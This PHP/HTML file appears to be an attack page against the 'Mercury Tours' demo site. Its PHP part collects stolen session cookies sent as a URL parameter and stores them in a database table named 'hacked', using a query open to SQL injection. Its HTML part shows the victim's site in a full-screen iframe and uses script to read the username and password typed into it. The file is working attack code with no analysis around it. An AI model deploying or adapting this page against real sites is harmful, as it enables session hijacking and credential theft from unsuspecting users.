<?php
if (isset($_GET["cookie"])){
	include "../credentials.php";
	$cookie = $_GET["cookie"] ?? '';
	if ($cookie != ""){
		$sql = "INSERT into hacked values ('$cookie');";
		mysqli_query($conn,$sql);
	}
	header("Location: /hacked/hacked_3.php");
}
?>
<html>
	<head>
		<title>Welcome: Mercury Tours</title>
	  <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
	</head>
	<body style="margin:0;padding:0;width:100%;height:100%;">
		<iframe id="iframe" src="http://victims_ip_address" onload="myFunction();" scrolling="no" style="width: 100%;height: 100%; overflow: hidden;border: none;"></iframe>
	
		<script type="text/javascript">
			function myFunction(){
				var frame = document.getElementById("iframe").contentWindow;
				var user = frame.document.getElementsByName("userName")[0].value;
				var pass = frame.document.getElementsByName("password")[0].value; 
				console.log("username: " + user + ", password: " + pass);
			}
		</script>
	</body>
</html>